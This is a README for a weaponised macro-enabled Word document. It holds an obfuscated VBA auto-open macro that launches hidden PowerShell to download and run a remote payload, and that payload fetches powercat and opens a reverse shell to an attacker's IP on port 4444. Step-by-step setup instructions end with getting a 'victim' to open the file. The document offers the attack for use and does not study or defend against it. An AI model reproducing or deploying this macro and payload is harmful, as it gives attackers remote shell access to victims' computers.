# MS Word virus

`document.docm` is a Word document with an obfuscated macro that will activate when the document is opened.

## The Macro

The macro:
```vba
Sub Auto_Open()
Dim first As String
Dim second As String
Dim third As String
Dim fourth As String
Dim fifth As String
Dim sixth As String
Dim seventh As String
Dim eighth As String
Dim ninth As String
Dim tenth As String
Dim eleventh As String
Dim twelfth As String
Dim thirteenth As String
Dim fourteenth As String
Dim fifteenth As String
Dim sixteenth As String
Dim seventeenth As String
Dim cmd As String
' This part might vary depending on your GitHub username, the repo name and the branch.
first = ChrW(112) & ChrW(111) & ChrW(119) & ChrW(101) & ChrW(114) & ChrW(115) & ChrW(104) & ChrW(101) & ChrW(108) & ChrW(108)
second = ChrW(46) & ChrW(101) & ChrW(120) & ChrW(101) & ChrW(32) & ChrW(45) & ChrW(119) & ChrW(32) & ChrW(104) & ChrW(105)
third = ChrW(100) & ChrW(100) & ChrW(101) & ChrW(110) & ChrW(32) & ChrW(45) & ChrW(99) & ChrW(32) & ChrW(34) & ChrW(73)
fourth = ChrW(69) & ChrW(88) & ChrW(32) & ChrW(40) & ChrW(78) & ChrW(101) & ChrW(119) & ChrW(45) & ChrW(79) & ChrW(98)
fifth = ChrW(106) & ChrW(101) & ChrW(99) & ChrW(116) & ChrW(32) & ChrW(83) & ChrW(121) & ChrW(115) & ChrW(116) & ChrW(101)
sixth = ChrW(109) & ChrW(46) & ChrW(78) & ChrW(101) & ChrW(116) & ChrW(46) & ChrW(87) & ChrW(101) & ChrW(98) & ChrW(67)
seventh = ChrW(108) & ChrW(105) & ChrW(101) & ChrW(110) & ChrW(116) & ChrW(41) & ChrW(46) & ChrW(68) & ChrW(111) & ChrW(119)
eighth = ChrW(110) & ChrW(108) & ChrW(111) & ChrW(97) & ChrW(100) & ChrW(83) & ChrW(116) & ChrW(114) & ChrW(105) & ChrW(110)
ninth = ChrW(103) & ChrW(40) & ChrW(39) & ChrW(104) & ChrW(116) & ChrW(116) & ChrW(112) & ChrW(115) & ChrW(58) & ChrW(47)
tenth = ChrW(47) & ChrW(114) & ChrW(97) & ChrW(119) & ChrW(46) & ChrW(103) & ChrW(105) & ChrW(116) & ChrW(104) & ChrW(117)
eleventh = ChrW(98) & ChrW(117) & ChrW(115) & ChrW(101) & ChrW(114) & ChrW(99) & ChrW(111) & ChrW(110) & ChrW(116) & ChrW(101)
twelfth = ChrW(110) & ChrW(116) & ChrW(46) & ChrW(99) & ChrW(111) & ChrW(109) & ChrW(47) & ChrW(87) & ChrW(105) & ChrW(110)
thirteenth = ChrW(112) & ChrW(97) & ChrW(114) & ChrW(87) & ChrW(105) & ChrW(110) & ChrW(112) & ChrW(97) & ChrW(114) & ChrW(47)
fourteenth = ChrW(109) & ChrW(115) & ChrW(45) & ChrW(119) & ChrW(111) & ChrW(114) & ChrW(100) & ChrW(45) & ChrW(118) & ChrW(105)
fifteenth = ChrW(114) & ChrW(117) & ChrW(115) & ChrW(47) & ChrW(109) & ChrW(97) & ChrW(105) & ChrW(110) & ChrW(47) & ChrW(112)
sixteenth = ChrW(97) & ChrW(121) & ChrW(108) & ChrW(111) & ChrW(97) & ChrW(100) & ChrW(46) & ChrW(116) & ChrW(120) & ChrW(116)
seventeenth = ChrW(39) & ChrW(41) & ChrW(34)
cmd = first + second + third + fourth + fifth + sixth + seventh + eighth + ninth + tenth + eleventh + twelfth + thirteenth + fourteenth + fifteenth + sixteenth + seventeenth
Shell (cmd)
End Sub
Sub AutoOpen()
Auto_Open
End Sub
Sub Workbook_Open()
Auto_Open
End Sub
```

When the macro runs, it gets the contents of `payload.txt` and runs it as a powershell script.

`payload.txt`:
```powershell
IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
powercat -c ###.###.###.### -p 4444 -e powershell.exe
```

`payload.txt` downloads `powecat`, than connects to a `NetCat` server on port 4444, using `powershell` as the shell.

## Setting it up

To set it up:
1. Create a ***private*** repo.
2. Create a file called `payload.txt` and paste the contents of the `payload.txt` from this repo, replacing `###.###.###.###` with your current IP address.

To get your IP address on Mac, run the following command:
```shell
echo $(ifconfig | grep broadcast | awk '{ print $2 }')
```
For Windows do the following command:
```batch
ipconfig
```
Then, look for [thing]. That will be your IP address.

3. Using the [command obfuscator for VBA](https://www.dropbox.com/s/38g95s4g2v7eclj/Obfuscate.jar?dl=1), obfuscate `powershell.exe -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/[your username]/[repo name]/[branch name]/payload.txt'))"`. Replace [your username] with your GitHub username, [repo name] with the name of the repo created in step 1 and [branch name] with the name of the branch that has `payload.txt` in it.
4. Open `document.docm` in MS Word.
5. Edit the `Auto_Open` macro (View > Macros > View Macros > Auto_Open).
6. Select everthing, including the other `Subs` (macros).
7. Paste the code from step 3 (already copied to clipboard).
8. Click the purple floppy disk icon in the top left to save the macro, than X out of that window.
9. Then you can do whatever with the document (making sure not to delete the `Auto_Open`, `AutoOpen` and `Workbook_Open` macros).
10. Then, just get your victim to open the document. Make sure to add them to the repo.
